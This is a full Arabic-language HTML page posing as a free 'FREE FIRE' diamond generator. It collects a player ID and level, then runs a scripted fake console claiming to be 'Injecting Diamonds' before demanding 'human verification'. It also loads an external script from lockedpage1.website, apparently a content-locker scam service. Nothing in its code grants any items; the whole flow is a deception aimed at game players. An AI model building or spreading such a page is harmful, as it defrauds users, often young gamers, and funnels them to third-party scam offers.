<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>💎💎</title>

<style>
:root { --primary:#ffcc00; --red:#e41e26; --dark-text:#1e293b; }

/* تحسينات عامة للتجاوب مع كافة الأجهزة */
*{
    box-sizing:border-box;
    -webkit-tap-highlight-color:transparent;
    touch-action: manipulation;
}

body{
    background:#ffffff;
    color:var(--dark-text);
    font-family:'Cairo',sans-serif;
    margin:0;
    padding:0;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    /* يضمن ملء كامل الشاشة حتى في متصفحات الآيفون */
    min-height: 100vh;
    min-height: -webkit-fill-available;
    overflow-x: hidden;
}

.main-container{
    width: 90%;
    max-width: 420px;
    background: #ffffff;
    border-radius: 20px;
    padding: 20px;
    border: 3px solid var(--primary);
    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
    text-align: center;
    /* التوسيط في منتصف الشاشة */
    margin: 20px auto;
}

.game-title{
    font-weight:900;
    font-size: clamp(1.5rem, 5vw, 1.8rem); /* حجم خط مرن حسب حجم الشاشة */
    color:var(--red);
    margin-bottom:20px;
}

.step-card{display:none;flex-direction:column;align-items:center;}
.step-card.active{display:flex;}

h2{
    font-size: clamp(1.1rem, 4vw, 1.3rem);
    margin-bottom:20px;
    color:var(--dark-text);
}

.input-box{
    width:100%;
    padding:15px;
    border-radius:10px;
    border:2px solid #e2e8f0;
    background:#f8fafc;
    color:#000;
    font-size:18px;
    margin-bottom:10px;
    text-align:center;
    outline:none;
    -webkit-appearance: none; /* يمنع التصميم الافتراضي المزعج في آيفون */
}

.btn-red{
    background:var(--red);
    color:#fff;
    border:none;
    padding:15px;
    width:100%;
    border-radius:10px;
    font-weight:700;
    font-size:18px;
    cursor:pointer;
    box-shadow:0 4px 0 #991b1b;
    margin-top:10px;
    transition: transform 0.1s;
}

.btn-red:active {
    transform: translateY(2px);
    box-shadow: 0 2px 0 #991b1b;
}

.gem-item{
    width:100%;
    background:#1e293b;
    padding: 12px clamp(10px, 3vw, 15px);
    border-radius:12px;
    margin-bottom:10px;
    display:flex;
    justify-content:space-between;
    align-items:center;
    border:1px solid #334155;
    cursor:pointer;
    color:#fff;
}

.gem-info{display:flex;align-items:center;gap:10px;font-weight:bold;font-size: clamp(0.9rem, 3.5vw, 1.1rem);}
.gem-tag{background:var(--primary);color:#000;padding:4px 12px;border-radius:5px;font-size:13px;font-weight:900;}

.console{
    background:#000;
    color:#22c55e;
    font-family:monospace;
    padding:10px;
    border-radius:8px;
    font-size:12px;
    text-align:left;
    direction:ltr;
    width:100%;
    height: 120px;
    overflow-y:auto;
    margin:15px 0;
}

.final-msg{
    color:#15803d;
    font-weight:bold;
    line-height:1.6;
    margin-bottom:15px;
    background:#f0fdf4;
    padding:10px;
    border-radius:8px;
    border:1px solid #bcf0da;
}

.error{color:#ff4b2b;font-size:13px;margin-bottom:10px;display:none;font-weight:bold;}

#robot-msg {
    color: red;
    font-weight: bold;
    margin-bottom: 10px;
    display: none;
    font-size: 1.1rem;
}

/* حل مشكلة الحواف في الهواتف الصغيرة جداً */
@media (max-width: 320px) {
    .main-container { padding: 15px; }
    .game-title { font-size: 1.3rem; }
}
</style>
</head>

<body>

<div class="main-container">
<div class="game-title">FREE FIRE</div>

<div id="step1" class="step-card active">
<h2>تسجيل الدخول بمعرف اللاعب</h2>
<input type="text" id="p-id" class="input-box" placeholder="معرف اللاعب (ID)" inputmode="numeric" pattern="[0-9]*">
<p id="err" class="error">⚠️ خطأ يرجى إدخال ID صحيح</p>
<button class="btn-red" onclick="valID()">تسجيل الدخول</button>
</div>

<div id="step2" class="step-card">
<h2>ما هو مستواك في اللعبة؟</h2>
<input type="text" id="p-lvl" class="input-box" placeholder="Account Level" inputmode="numeric" pattern="[0-9]*">
<button class="btn-red" onclick="move(3)">تأكيد المستوى</button>
</div>

<div id="step3" class="step-card">
<h2>اختر كمية الجواهر</h2>
<div class="gem-item" onclick="move(4)"><div class="gem-info">💎 100+10</div><div class="gem-tag">استلام</div></div>
<div class="gem-item" onclick="move(4)"><div class="gem-info">💎 210+20</div><div class="gem-tag">استلام</div></div>
<div class="gem-item" onclick="move(4)"><div class="gem-info">💎 530+31</div><div class="gem-tag">استلام</div></div>
<div class="gem-item" onclick="move(4)"><div class="gem-info">💎 1080+100</div><div class="gem-tag">استلام</div></div>
</div>

<div id="step4" class="step-card">
<h2 id="wait-text">جاري معالجة البيانات</h2>
<div class="console" id="log"></div>

<div id="fin" style="display:none;">
<p class="final-msg">تم التحقق من الحساب بنجاح</p>

<div id="robot-msg">الرجاء تأكيد أنك لست روبوت</div>

<div data-captcha-enable="true"></div>

<button class="btn-red" style="background:var(--primary);color:#000;box-shadow:0 4px 0 #b79500;" onclick="final()">اضغط للتحقق الأخير</button>
</div>
</div>
</div>

<script>
let playerID="";
function valID(){
const input=document.getElementById('p-id').value;
if(/^\d{7,12}$/.test(input)){
playerID=input;
document.getElementById('err').style.display='none';
move(2);
}else{
document.getElementById('err').style.display='block';
}
}

function move(s){
document.querySelectorAll('.step-card').forEach(c=>c.classList.remove('active'));
document.getElementById('step'+s).classList.add('active');
if(s===4)runLog();
}

function runLog(){
const log=document.getElementById('log');
const lines=["> Connecting...","> ID: "+playerID+" Found","> Checking Account Level...","> Injecting Diamonds...","> Human verification needed"];
let i=0;
let itv=setInterval(()=>{
log.innerHTML+=`<div>${lines[i]}</div>`;
log.scrollTop=log.scrollHeight;
i++;
if(i>=lines.length){
clearInterval(itv);
document.getElementById('fin').style.display='block';
document.getElementById('wait-text').innerText="اكتمل الفحص";
}
},1000);
}

function final(){
    document.getElementById('robot-msg').style.display = 'block';
}
</script>

<script type="text/javascript" src="https://lockedpage1.website/cp/js/dxdkp"></script>

</body>
</html>
